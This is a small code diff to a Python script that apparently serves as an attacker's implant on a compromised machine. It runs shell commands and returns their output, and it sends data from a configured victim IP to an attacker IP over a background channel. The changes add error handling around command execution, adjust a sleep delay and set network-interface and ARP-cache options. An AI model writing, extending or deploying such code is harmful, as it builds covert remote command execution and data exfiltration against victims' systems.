@@ -25,14 +25,17 @@ def build_parser() -> argparse.ArgumentParser:
 
 def run_shell_command(args) -> str:
     print(f'Running... {args}')
-    res = subprocess.run(args, capture_output=True, text=True)
+    try:
+        res = subprocess.run(args, capture_output=True, text=True)
+    except:
+        return f'Error running command: {args}'
     if res.returncode == 0:
         return res.stdout
     else:
         return res.stderr
 
 def _send_watch(data: bytes):
-    send_data(data, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP, channel=Channel.BACKGROUND, sleep=0)
+    send_data(data, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP, channel=Channel.BACKGROUND, sleep=1)
 
 def _wait_for_stop() -> bool:
     while True:
@@ -128,6 +131,9 @@ def main():
     Cfg.IFACE = args.iface
     Cfg.ATTACKER_IP = args.ip
     Cfg.VICTIM_IP = my_ip
+
+    conf.iface = args.iface
+    conf.netcache.arp_cache.timeout = 3600
 
     print('config: ' + ', '.join('%s: %s' % item for item in vars(Cfg).items() if not item[0].startswith('__')))
 
